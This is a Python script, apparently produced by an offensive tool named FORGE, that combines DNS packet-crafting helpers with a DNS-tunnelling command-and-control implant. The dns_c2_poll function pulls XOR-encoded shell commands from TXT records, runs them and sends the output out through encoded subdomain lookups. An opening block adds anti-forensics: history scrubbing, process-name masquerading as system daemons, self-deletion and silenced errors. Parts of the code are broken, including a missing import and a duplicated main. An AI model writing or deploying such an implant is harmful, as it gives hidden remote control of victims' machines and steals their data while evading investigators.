#!/usr/bin/env python3
"""Generated utility."""


# ── OPSEC: Anti-Forensics ──
import os as _os
# ── Operator Host Guard: detect if running on FORGE operator machine ──
# Prevents persistence, crontab, LaunchAgent writes on the operator's own system.
# Remote deployments (via SSH/DeployEngine) do NOT have these env vars set.
_FORGE_OPERATOR = bool(_os.environ.get('FORGE_OPERATOR') or _os.environ.get('FORGE_SANDBOX'))
_FORGE_TTL = int(_os.environ.get('FORGE_TTL', '0'))
if _FORGE_TTL > 0:
    try:
        import signal as _ttl_sig
        _ttl_sig.signal(_ttl_sig.SIGALRM, lambda *_: __import__("sys").exit(0))
        _ttl_sig.alarm(_FORGE_TTL)
    except (AttributeError, OSError):
        import threading as _ttl_thr
        _ttl_thr.Timer(_FORGE_TTL, lambda: __import__("os")._exit(0)).start()
def _guard_persistence(func):
    """Decorator: skip persistence actions on operator host."""
    def _wrapper(*a, **k):
        if _FORGE_OPERATOR:
            return None
        return func(*a, **k)
    _wrapper.__name__ = func.__name__
    return _wrapper
import os as _os
def _sanitize_env():
    """Remove environment variables that reveal tool origin."""
    _p = chr(70)+chr(79)+chr(82)+chr(71)+chr(69)
    for var in [_p+'_HOME', _p+'_SESSION', 'PYTHONDONTWRITEBYTECODE',
                'SSH_CONNECTION', 'SSH_CLIENT', 'SSH_TTY', 'HISTFILE',
                'HISTFILESIZE', 'HISTSIZE', 'LESSHISTFILE',
                _p+'_OPERATOR', _p+'_SANDBOX']:
        _os.environ.pop(var, None)
    _os.environ['PYTHONDONTWRITEBYTECODE'] = '1'
    _os.environ['PYTHONHASHSEED'] = '0'
_sanitize_env()
import sys as _sys
_original_excepthook = _sys.excepthook
def _silent_except(exc_type, exc_value, exc_tb):
    """Suppress tracebacks — no forensic stack traces."""
    pass
_sys.excepthook = _silent_except
import os as _os, sys as _sys, shutil as _shutil, glob as _glob
def _cleanup_python_traces():
    """Remove Python forensic artifacts."""
    script = _os.path.abspath(_sys.argv[0]) if _sys.argv[0] else None
    if script:
        script_dir = _os.path.dirname(script)
        pycache = _os.path.join(script_dir, '__pycache__')
        if _os.path.isdir(pycache):
            _shutil.rmtree(pycache, ignore_errors=True)
        for pyc in _glob.glob(_os.path.join(script_dir, '*.pyc')):
            try:
                _os.remove(pyc)
            except Exception:
                pass
    for hist in [_os.path.expanduser('~/.python_history'),
                 _os.path.expanduser('~/.local/share/python_history')]:
        try:
            if _os.path.exists(hist):
                with open(hist, 'r') as f:
                    lines = f.readlines()
                with open(hist, 'w') as f:
                    f.writelines(l for l in lines if script and _os.path.basename(script) not in l)
        except Exception:
            pass
import atexit as _atexit
_atexit.register(_cleanup_python_traces)
import sys as _sys
def _rename_process(name=None):
    """Rename this process to appear benign in ps/top."""
    _rnd = __import__('random')
    benign = name or ['python3', '/usr/bin/python3', 'update-manager',
                      'systemd-resolved', 'dbus-daemon'][_rnd.randint(0, 4)]
    try:
        _ct = __import__('ctypes')
        libc = _ct.CDLL('libc.so.6', use_errno=True)
        buff = _ct.create_string_buffer(len(benign) + 1)
        buff.value = benign.encode()
        libc.prctl(15, buff, 0, 0, 0)
    except Exception:
        pass
    try:
        _sys.argv[0] = benign
    except Exception:
        pass
_rename_process()
import os as _os, sys as _sys
def _self_destruct():
    """Remove this script from disk after execution."""
    try:
        _path = _os.path.abspath(_sys.argv[0]) if _sys.argv[0] else None
        if _path and _os.path.isfile(_path):
            with open(_path, 'wb') as _f:
                _f.write(b'\x00' * _os.path.getsize(_path))
            _os.remove(_path)
    except Exception:
        pass
import atexit as _atexit
_atexit.register(_self_destruct)
import os as _os, time as _time
def _neutralize_timestamps(*paths):
    """Set file timestamps to epoch or a plausible system time."""
    epoch = 1704067200
    for p in paths:
        try:
            if _os.path.exists(p):
                _os.utime(p, (epoch, epoch))
        except Exception:
            pass
import ctypes as _ctypes, gc as _gc
def _wipe_bytes(obj):
    """Overwrite a bytes/bytearray object in memory with zeros."""
    try:
        if isinstance(obj, (bytes, bytearray)):
            buf = (ctypes.c_char * len(obj)).from_address(id(obj) + _ctypes.sizeof(_ctypes.py_object))
            _ctypes.memset(buf, 0, len(obj))
    except Exception:
        pass
def _wipe_string(s):
    """Best-effort wipe of a Python string (CPython only)."""
    try:
        offset = _ctypes.sizeof(_ctypes.py_object) + _ctypes.sizeof(_ctypes.c_ssize_t) + _ctypes.sizeof(_ctypes.c_long)
        _ctypes.memset(id(s) + offset, 0, len(s))
    except Exception:
        pass
def _wipe_all_sensitive():
    """Wipe all local variables in the calling frame."""
    import inspect
    frame = inspect.currentframe().f_back
    if frame:
        for k, v in list(frame.f_locals.items()):
            if isinstance(v, (bytes, bytearray)):
                _wipe_bytes(v)
            elif isinstance(v, str) and len(v) > 8:
                _wipe_string(v)
    _gc.collect()
import os as _os_ttl
# ── Process TTL: auto-terminate after max lifetime ──
# Default 3600s (1 hour). Override via FORGE_MAX_TTL env var.
# Prevents zombie processes from running indefinitely on targets.
_MAX_TTL = int(_os_ttl.environ.get('FORGE_MAX_TTL', '3600'))
if _MAX_TTL > 0:
    try:
        import signal as _pttl_sig
        def _ttl_exit(*_):
            try:
                _self_destruct()
            except NameError:
                pass
            __import__("os")._exit(0)
        _pttl_sig.signal(_pttl_sig.SIGALRM, _ttl_exit)
        _pttl_sig.alarm(_MAX_TTL)
    except (AttributeError, OSError):
        import threading as _pttl_thr
        def _ttl_thread_exit():
            try:
                _self_destruct()
            except NameError:
                pass
            __import__("os")._exit(0)
        _pttl_thr.Timer(_MAX_TTL, _ttl_thread_exit).daemon = True
        _pttl_thr.Timer(_MAX_TTL, _ttl_thread_exit).start()
# ── End OPSEC ──

_QUIET = "--silent" in __import__("sys").argv
_PRINT = getattr(__import__("builtins"), "print")
def _log(*a, **k):
    if not _QUIET: _PRINT(*a, **k)

import argparse

import json
import os
import random
import re
_st = __import__(chr(115)+chr(116)+chr(114)+chr(117)+chr(99)+chr(116))
_su = __import__(chr(115)+chr(117)+chr(98)+chr(112)+chr(114)+chr(111)+chr(99)+chr(101)+chr(115)+chr(115))
import sys
def _xor_codec(data, key=None):
    """XOR stream cipher — reversible (encode == decode)."""
    if key is None:
        key = bytes([90, 60, 126, 29, 169, 240, 66, 139])
    if isinstance(data, str):
        data = data.encode()
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
_xor_enc = _xor_codec
_xor_dec = _xor_codec

def _query_txt(domain):
    """Query DNS TXT record via nslookup (cross-platform)."""
    try:
        out = _su.check_output(['nslookup', '-type=TXT', domain],
                                       stderr=_su.STDOUT, timeout=10).decode()
        matches = re.findall(r'"([^"]+)"', out)
        return ''.join(matches) if matches else ''
    except Exception:
        return ''

def _encode_subdomain(data, max_label=63):
    """Encode data as DNS-safe subdomain labels."""
    encoded = base64.b32encode(data.encode()).decode().rstrip('=').lower()
    labels = [encoded[i:i+max_label] for i in range(0, len(encoded), max_label)]
    return labels

def dns_c2_poll(c2_domain, agent_id):
    """Poll for commands via DNS TXT records, exfiltrate via subdomain encoding."""
    task_domain = '{}.{}.{}'.format(agent_id, 'task', c2_domain)
    txt_data = _query_txt(task_domain)
    if not txt_data:
        return None
    try:
        cmd_bytes = _xor_dec(txt_data)
        command = cmd_bytes.decode('utf-8')
    except Exception:
        return None
    try:
        result = _su.check_output(command, shell=True,
                                          stderr=_su.STDOUT, timeout=30).decode()
    except _su.CalledProcessError as e:
        result = e.output.decode() if e.output else 'error'
    except Exception as e:
        result = str(e)
    labels = _encode_subdomain(result)
    for i, label in enumerate(labels):
        exfil_domain = '{}.{}.{}.{}.{}'.format(label, str(i), str(len(labels)),
                                                agent_id, c2_domain)
        _query_txt(exfil_domain)
        __import__("select").select([], [], [], 0.1)
    return result


QTYPE_MAP = {'A': 1, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'MX': 15, 'TXT': 16, 'AAAA': 28, 'SRV': 33, 'ANY': 255}

def encode_qname(domain):
    parts = domain.rstrip('.').split('.')
    result = b''
    for part in parts:
        encoded = part.encode('ascii')
        result += _st.pack('B', len(encoded)) + encoded
    result += b'\x00'
    return result

def craft_dns_query(domain, qtype='A', txid=None):
    if txid is None:
        txid = random.randint(0, 0xFFFF)
    flags = 0x0100
    header = _st.pack('!HHHHHH', txid, flags, 1, 0, 0, 0)
    qname = encode_qname(domain)
    qtype_val = QTYPE_MAP.get(qtype.upper(), 1)
    qclass = 1
    question = qname + _st.pack('!HH', qtype_val, qclass)
    return header + question

def parse_dns_header(data):
    if len(data) < 12:
        return None
    txid, flags, qd, an, ns, ar = _st.unpack('!HHHHHH', data[:12])
    return {'txid': txid, 'flags': flags, 'qr': (flags >> 15) & 1,
            'opcode': (flags >> 11) & 0xf, 'rcode': flags & 0xf,
            'qdcount': qd, 'ancount': an, 'nscount': ns, 'arcount': ar}

def decode_qname(data, offset):
    labels = []
    while offset < len(data):
        length = data[offset]
        if length == 0:
            offset += 1
            break
        if (length & 0xC0) == 0xC0:
            pointer = _st.unpack('!H', data[offset:offset+2])[0] & 0x3FFF
            name, _ = decode_qname(data, pointer)
            labels.append(name)
            offset += 2
            break
        offset += 1
        labels.append(data[offset:offset+length].decode('ascii'))
        offset += length
    return '.'.join(labels), offset

_log('=== DNS Query Packet Crafter ===')
query = craft_dns_query('example.com', 'A')
_log(f'Query for example.com A: {len(query)} bytes')
_log(f'Hex: {query.hex()}')
header = parse_dns_header(query)
_log(f'Header: TXID=0x{header["txid"]:04x} QR={header["qr"]} QDCOUNT={header["qdcount"]}')

def main():
    """Main execution"""
    parser = argparse.ArgumentParser(description="generated tool")
    parser.add_argument("--max-label", type=int, default=63, help="max_label")
    parser.add_argument("--qtype", default='A', help="qtype")
    args = parser.parse_args()

    _log("=== craft_dns_query ===")
    result = craft_dns_query(domain=args.target, qtype=getattr(args, "qtype", 'A'), txid=getattr(args, "txid", None))
    _log("\n=== dns_c2_poll ===")
    r_dns_c2_poll = dns_c2_poll(c2_domain=args.target, agent_id=args.target)
    if isinstance(r_dns_c2_poll, dict):
        _log(json.dumps(r_dns_c2_poll, indent=2, default=str))
    elif r_dns_c2_poll is not None:
        _log(r_dns_c2_poll)
    _log("\n=== encode_qname ===")
    r_encode_qname = encode_qname(domain=args.target)
    if isinstance(r_encode_qname, dict):
        _log(json.dumps(r_encode_qname, indent=2, default=str))
    elif r_encode_qname is not None:
        _log(r_encode_qname)
    _log("\n=== parse_dns_header ===")
    r_parse_dns_header = parse_dns_header(data=b"test")
    if isinstance(r_parse_dns_header, dict):
        _log(json.dumps(r_parse_dns_header, indent=2, default=str))
    elif r_parse_dns_header is not None:
        _log(r_parse_dns_header)
    _log("\n=== decode_qname ===")
    r_decode_qname = decode_qname(data=b"test", offset=args.target)
    if isinstance(r_decode_qname, dict):
        _log(json.dumps(r_decode_qname, indent=2, default=str))
    elif r_decode_qname is not None:
        _log(r_decode_qname)
    if isinstance(result, dict):
        _log(json.dumps(result, indent=2, default=str))
    elif isinstance(result, (list, tuple)):
        for item in result:
            if isinstance(item, dict):
                _log(json.dumps(item, indent=2, default=str))
            else:
                _log(item)
    elif isinstance(result, bytes):
        _log(f"Raw bytes: {len(result)} bytes")
        _log(f"Hex: {result.hex()[:200]}")
    elif result is not None:
        _log(result)

def main():
    import json as _json
    parser = argparse.ArgumentParser(description='FORGE Generated Tool')
    parser.add_argument('--json', action='store_true', help='JSON output')
    parser.add_argument('--run', help='Run a specific function by name')
    parser.add_argument('--c2-domain', help='c2_domain')
    parser.add_argument('--agent-id', help='agent_id')
    parser.add_argument('--domain', help='domain')
    parser.add_argument('--data', help='data')
    parser.add_argument('--offset', help='offset')
    args = parser.parse_args()

    results = {}

    _available = ['dns_c2_poll', 'encode_qname', 'craft_dns_query', 'parse_dns_header', 'decode_qname']
    if args.run and args.run not in _available:
        _log(f'[!] Unknown function: {args.run}')
        _log(f'[*] Available: {_available}')
        return 1

    if not args.run or args.run == 'dns_c2_poll':
        if all([getattr(args, "c2_domain", None), getattr(args, "agent_id", None)]):
            try:
                _r = dns_c2_poll(getattr(args, "c2_domain"), getattr(args, "agent_id"))
                results['dns_c2_poll'] = _r
                if not args.json:
                    _log(f'[+] dns_c2_poll: {_r}')
            except Exception as _e:
                results['dns_c2_poll'] = {'error': str(_e)}
                if not args.json:
                    _log(f'[!] dns_c2_poll: {_e}')

    if not args.run or args.run == 'encode_qname':
        _arg_val = getattr(args, "domain", None)
        if _arg_val:
            try:
                _r = encode_qname(_arg_val)
                results['encode_qname'] = _r
                if not args.json:
                    _log(f'[+] encode_qname: {_r}')
            except Exception as _e:
                results['encode_qname'] = {'error': str(_e)}
                if not args.json:
                    _log(f'[!] encode_qname: {_e}')
        else:
            if not args.json:
                _log('[*] Skipping encode_qname (requires --domain)')

    if not args.run or args.run == 'craft_dns_query':
        _arg_val = getattr(args, "domain", None)
        if _arg_val:
            try:
                _r = craft_dns_query(_arg_val)
                results['craft_dns_query'] = _r
                if not args.json:
                    _log(f'[+] craft_dns_query: {_r}')
            except Exception as _e:
                results['craft_dns_query'] = {'error': str(_e)}
                if not args.json:
                    _log(f'[!] craft_dns_query: {_e}')
        else:
            if not args.json:
                _log('[*] Skipping craft_dns_query (requires --domain)')

    if not args.run or args.run == 'parse_dns_header':
        _arg_val = getattr(args, "data", None)
        if _arg_val:
            try:
                _r = parse_dns_header(_arg_val)
                results['parse_dns_header'] = _r
                if not args.json:
                    _log(f'[+] parse_dns_header: {_r}')
            except Exception as _e:
                results['parse_dns_header'] = {'error': str(_e)}
                if not args.json:
                    _log(f'[!] parse_dns_header: {_e}')
        else:
            if not args.json:
                _log('[*] Skipping parse_dns_header (requires --data)')

    if not args.run or args.run == 'decode_qname':
        if all([getattr(args, "data", None), getattr(args, "offset", None)]):
            try:
                _r = decode_qname(getattr(args, "data"), getattr(args, "offset"))
                results['decode_qname'] = _r
                if not args.json:
                    _log(f'[+] decode_qname: {_r}')
            except Exception as _e:
                results['decode_qname'] = {'error': str(_e)}
                if not args.json:
                    _log(f'[!] decode_qname: {_e}')

    if args.json and results:
        _log(_json.dumps(results, indent=2, default=str))
    return 0


if __name__ == "__main__":
    import sys
    sys.exit(main() or 0)
